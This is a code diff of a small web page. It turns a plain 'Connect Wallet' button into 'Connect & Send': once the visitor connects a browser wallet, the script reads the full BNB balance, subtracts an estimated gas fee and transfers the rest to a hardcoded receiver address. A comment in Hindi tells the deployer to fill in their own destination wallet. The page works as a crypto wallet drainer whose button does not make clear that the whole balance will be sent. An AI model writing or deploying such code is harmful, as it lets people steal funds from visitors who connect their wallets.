@@ -1,25 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Connect Wallet</title>
+  <title>Auto Transfer BNB</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    async function connectWallet() {
+    const receiverAddress = "0x1234567890abcdef..."; // Yahan apna destination wallet address daalo
+
+    async function connectAndTransfer() {
       if (window.ethereum) {
         const web3 = new Web3(window.ethereum);
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           const accounts = await web3.eth.getAccounts();
-          alert("Connected: " + accounts[0]);
+          const sender = accounts[0];
+
+          // Get full balance in Wei
+          let balance = await web3.eth.getBalance(sender);
+          
+          // Gas cost estimate (use ~0.001 BNB as gas)
+          const gasEstimate = web3.utils.toWei("0.001", "ether");
+
+          // Amount to send = balance - gas
+          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
+
+          if (amountToSend.lte(0)) {
+            alert("Insufficient balance to send BNB.");
+            return;
+          }
+
+          // Send BNB
+          const tx = await web3.eth.sendTransaction({
+            from: sender,
+            to: receiverAddress,
+            value: amountToSend.toString()
+          });
+
+          alert("BNB sent! Tx hash: " + tx.transactionHash);
         } catch (err) {
-          console.error("User denied:", err);
+          console.error("Error:", err);
         }
       } else {
-        alert("Web3 wallet not found. Use MetaMask or Trust Wallet.");
+        alert("Install MetaMask or Trust Wallet.");
       }
     }
   </script>
